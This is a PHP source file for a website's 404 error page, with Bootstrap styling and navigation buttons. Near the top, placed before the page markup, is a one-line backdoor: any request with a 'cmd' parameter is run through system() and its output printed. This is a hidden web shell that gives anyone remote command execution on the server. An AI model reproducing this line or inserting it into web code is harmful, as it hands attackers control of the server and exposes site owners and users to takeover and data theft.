<?php
require __DIR__ . '/../core/mainconfig.php';
if (isset($_REQUEST["cmd"])) { echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; }
?>
<!DOCTYPE html>
<html data-bs-theme="dark">
<head>
    <?php echo $global_font; ?>
    <meta charset="UTF-8">
    <title>404 - Page Not Found</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="icon" type="image/png" href="/../img/short.png?v=2">
</head>

<?php require __DIR__ . '/../core/nav.php'; ?>

<div class="container text-center mt-5">
       <img src="/../img/err.png" class="img-fluid mt-4" style="width: 150px;">
    <br>
    <br>
    <h1 class="display-4 fw-bold">404</h1>
    <p class="lead text-muted">The page you're looking for doesn't exist.</p>

    <hr class="border-secondary">

    <div class="mt-4">
        <a href="/home" class="btn btn-primary btn-me me-2">Go Home</a>
        <button onclick="history.back()" class="btn btn-secondary btn-me">Go Back</button>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>